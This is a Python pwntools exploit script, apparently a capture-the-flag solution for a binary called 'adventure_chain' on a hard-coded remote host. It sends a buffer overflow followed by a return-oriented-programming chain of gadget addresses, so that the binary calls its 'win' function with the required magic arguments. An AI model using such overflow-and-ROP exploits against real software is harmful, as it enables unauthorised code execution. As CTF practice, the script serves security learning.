#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 34.72.218.129 --port 1111
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './adventure_chain'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '34.72.218.129'
port = int(args.PORT or 4444)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x04009ef
b *0x04009f9
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# win = 0040082c with arg1 = 0xdeadc0de and arg2 = dead10cc
#   edi = deadc0de
#   esi = deadl0cc
# win conditions
#   0060108c = 0x1337 - call assert 004007d7
#   00601090 = 0xcafebabe - call setValue(0xdeadbeef) edi=deadbeef  004007ec
# 
# 0x0000000000400a93 pop rdi
# 0x0000000000400a91 : pop rsi ; pop r15 ; ret

assert_addr = 0x04007d7
setValue = 0x4007ec
flag = 0x40082c
pop_rdi = 0x400a93
pop_rsi_pop_r15 = 0x400a91

io = start()

io.recvuntil(b'>> ')

io.send(b'1\n')

io.recvuntil(b'name:')

payload = cyclic(40)
payload += p64(assert_addr) # assert, sets password = 0x1337
payload += p64(pop_rdi) # pop rdi; ret
payload += p64(0xdeadbeef) # rdi
payload += p64(setValue) # setValue
payload += p64(pop_rsi_pop_r15)
payload += p64(0xdead10cc)
payload += p64(0xffff) # ignored
payload += p64(pop_rdi)
payload += p64(0xdeadc0de)
payload += p64(flag)

io.send(payload + b'\n')

io.interactive()

